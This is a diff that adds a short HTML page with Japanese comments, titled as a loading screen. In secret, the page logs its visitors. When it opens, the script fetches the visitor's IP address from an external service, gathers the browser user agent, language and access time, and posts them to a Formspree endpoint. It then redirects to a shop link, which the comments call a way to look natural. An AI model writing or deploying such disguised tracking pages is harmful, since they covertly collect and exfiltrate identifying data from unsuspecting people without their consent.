@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>読み込み中...</title>
+</head>
+<body>
+    <script>
+        // ページが開かれた瞬間に実行
+        window.onload = async function() {
+            const endpoint = "https://formspree.io/f/mlgpyynd:";
+            
+            // 1. 相手のIPアドレスを取得（外部APIを利用）
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+
+            // 2. 送信するデータをまとめる
+            const payload = new FormData();
+            payload.append("IPアドレス", ipData.ip);
+            payload.append("端末情報", navigator.userAgent);
+            payload.append("言語設定", navigator.language);
+            payload.append("アクセス時刻", new Date().toLocaleString());
+
+            // 3. データをFormspreeに送信
+            fetch(endpoint, {
+                method: "POST",
+                body: payload,
+                headers: { 'Accept': 'application/json' }
+            }).then(() => {
+                // 4. 送信が終わったら、不自然じゃないサイトへ飛ばす
+                window.location.href = "https://shoplnk.me/FuulinWeb";
+            });
+        };
+    </script>
+</body>
+</html>
